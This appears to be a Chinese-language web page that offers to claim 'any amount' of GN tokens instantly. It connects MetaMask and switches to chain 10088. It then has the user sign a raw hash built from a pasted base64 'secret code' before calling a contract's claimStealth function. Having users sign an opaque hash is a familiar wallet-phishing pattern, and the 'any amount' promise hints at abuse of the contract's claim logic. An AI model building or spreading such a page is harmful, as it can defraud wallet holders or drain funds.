<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>GN 任意数量秒领</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:system-ui;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:1rem}
.c{max-width:380px;width:100%;background:#111;border:2px solid #00ff88;border-radius:25px;padding:30px;box-shadow:0 0 40px #00ff8850}
.logo{width:80px;height:80px;border-radius:50%;margin:0 auto 20px}
h1{font-size:26px;text-align:center;background:linear-gradient(90deg,#00ff88,#88ff00);-webkit-background-clip:text;color:transparent}
textarea{width:100%;padding:14px;margin:12px 0;border-radius:14px;background:#000;border:1px solid #333;color:#fff;font-size:14px}
button{width:100%;padding:16px;margin:10px 0;border:none;border-radius:14px;font-weight:900;font-size:16px;cursor:pointer;transition:0.3s}
.old{background:#ff4444;color:#fff}
.old:hover{background:#ff2222;transform:scale(1.03)}
.new{background:#00ff88;color:#000}
.new:hover{background:#00cc66;transform:scale(1.03)}
#log{color:#0f0;text-align:center;margin-top:15px;font-size:15px;line-height:1.6}
</style>
</head>
<body>
<div class="c">
  <img src="https://raw.githubusercontent.com/WoofingLabs/Grabbit/main/images/GN.png" class="logo">
  <h1>GN 任意数量秒领</h1>
  
  <textarea id="code" rows="3" placeholder="粘贴你的暗号"></textarea>
  
  <button class="old" id="oldBtn">旧版 MetaMask 领取</button>
  <button class="new" id="newBtn">新版 MetaMask 领取</button>
  
  <div id="log">粘贴暗号 → 点你版本 → 秒到账</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>

<script>
// 10088 链完整配置（永不再用 0x2768）
const chains = {
    GateLayer: {
        chainId: 10088,
        chainName: 'Gate Layer',
        rpcUrl: 'https://gatelayer-mainnet.gatenode.cc/',
        blockExplorer: 'https://www.gatescan.org/gatelayer/',
        nativeCurrency: { name: 'GT', symbol: 'GT', decimals: 18 }
    }
};

const ADDR = '0x57F46345eC70a8c9a9BA7F8c67A0355573596749';

// 完整 ABI
const ABI = [
  {
    "inputs": [
      {"internalType":"bytes32","name":"_stealthAddress","type":"bytes32"},
      {"internalType":"bytes","name":"_ephemeralPubKey","type":"bytes"},
      {"internalType":"uint256","name":"_amount","type":"uint256"}
    ],
    "name":"stealthTransfer",
    "outputs":[],
    "stateMutability":"nonpayable",
    "type":"function"
  },
  {
    "inputs": [
      {"internalType":"address","name":"_sender","type":"address"},
      {"internalType":"uint256","name":"_amount","type":"uint256"},
      {"internalType":"bytes32","name":"_stealthAddress","type":"bytes32"},
      {"internalType":"bytes","name":"_ephemeralPubKey","type":"bytes"},
      {"internalType":"bytes32","name":"r","type":"bytes32"},
      {"internalType":"bytes32","name":"s","type":"bytes32"},
      {"internalType":"uint8","name":"v","type":"uint8"}
    ],
    "name":"claimStealth",
    "outputs":[],
    "stateMutability":"nonpayable",
    "type":"function"
  }
];

let web3, account, contract;
const log = document.getElementById('log');

// 10088 链切换（完整写法）
async function switchTo10088() {
    const c = chains.GateLayer;
    try {
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${c.chainId.toString(16)}` }]
        });
    } catch (e) {
        if (e.code === 4902) {
            await ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                    chainId: `0x${c.chainId.toString(16)}`,
                    chainName: c.chainName,
                    rpcUrls: [c.rpcUrl],
                    nativeCurrency: c.nativeCurrency,
                    blockExplorerUrls: [c.blockExplorer]
                }]
            });
        }
    }
}

// 自动连接
async function connect() {
    if (!window.ethereum) return log.innerHTML = '请安装 MetaMask';
    await switchTo10088();
    await ethereum.request({method:'eth_requestAccounts'});
    web3 = new Web3(window.ethereum);
    account = (await web3.eth.getAccounts())[0];
    contract = new web3.eth.Contract(ABI, ADDR);
    log.innerHTML = `已连接 <b>${account.slice(0,8)}...</b><br>粘贴暗号 → 点你版本`;
}
connect();

// 万能领取（支持任意数量）
async function claim(useOldMode) {
    const input = document.getElementById('code').value.trim();
    if (!input) return log.innerHTML = '请粘贴暗号';
    let d;
    try { d = JSON.parse(atob(input)); } catch { return log.innerHTML = '暗号错误'; }

    log.innerHTML = '正在签名...';
    const msg = web3.utils.keccak256(
        web3.eth.abi.encodeParameters(
            ['address','uint256','bytes32','bytes'],
            [d.s, web3.utils.toWei(d.a,'ether'), d.t, d.p]
        )
    );

    const sig = await ethereum.request({
        method: 'personal_sign',
        params: [msg, account, ""]
    });

    const r = sig.slice(0,66);
    const s = '0x' + sig.slice(66,130);
    let v = parseInt(sig.slice(130,132),16);

    if (useOldMode && v > 30) v -= 1;
    if (v < 27) v += 27;

    log.innerHTML = `正在领取 <b>${d.a}</b> GN...`;
    try {
        await contract.methods.claimStealth(d.s, web3.utils.toWei(d.a,'ether'), d.t, d.p, r, s, v)
            .send({from: account});
        log.innerHTML = `<span style="color:#88ff00">成功！+${d.a} GN 已到账</span>`;
    } catch (e) {
        log.innerHTML = '失败：' + (e.message || '请检查 Gas');
    }
}

document.getElementById('oldBtn').onclick = () => claim(true);
document.getElementById('newBtn').onclick = () => claim(false);
</script>
</body>
</html>
